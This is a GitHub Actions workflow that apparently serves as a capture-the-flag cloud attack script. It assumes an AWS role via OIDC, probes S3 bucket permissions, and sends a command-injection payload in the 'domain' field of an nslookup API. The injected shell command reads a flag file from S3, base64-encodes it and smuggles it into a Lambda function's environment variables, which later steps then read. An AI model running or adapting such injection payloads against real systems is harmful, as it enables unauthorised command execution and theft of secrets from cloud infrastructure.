name: assume-role
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  assume:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
      - run: aws s3api get-bucket-policy --bucket platform-bucket-009661764077-us-east-1 || true
      - run: aws s3api get-bucket-acl --bucket platform-bucket-009661764077-us-east-1 || true
      - run: |
                curl -s -X POST \
                  -H "Content-Type: application/json" \
                  -d '{"domain":"example.com; FLAG=$(/opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1 | base64 -w 0); /opt/aws lambda update-function-configuration --function-name nslookupv2 --region us-east-1 --environment \"Variables={FLAG=$FLAG}\""}' \
                  "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
      - run: sleep 10
      - run: aws lambda get-function-configuration --function-name nslookupv2 --query 'Environment.Variables'
      - run: aws s3 cat s3://codec4f26c862a321ef5/flag.txt || true